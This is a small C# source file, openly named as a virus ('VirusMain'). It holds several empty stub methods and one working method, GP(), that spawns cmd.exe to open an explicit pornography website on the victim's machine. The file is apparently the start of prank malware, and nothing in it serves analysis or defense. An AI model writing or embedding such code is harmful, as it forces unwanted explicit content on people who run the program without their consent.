using System;
using System.Diagnostics;


namespace VirusMain
{
    class StartCalass
    {
        public static void StartVir()
        {
            bool IsWork = true;
            if (IsWork)
            {

            }
        }
    }
    class MainClass
    {
        public static void StartMainVir()
        {
            bool MainIsWork = false;
            if (MainIsWork)
            {

            }
        }
    }
    class SubClass
    {
        public static void StartSubVir(bool IsWork = true, int ToDo = 1)
        {
            bool SubIsWork = IsWork;
            if (SubIsWork)
            {
                if (ToDo == 1)
                {
                    GP();
                }
            }
        }
        private static void GP()
        {
            Process.Start("cmd", "/C start https://gay-porevo.top/hardcore");
        }
    }
}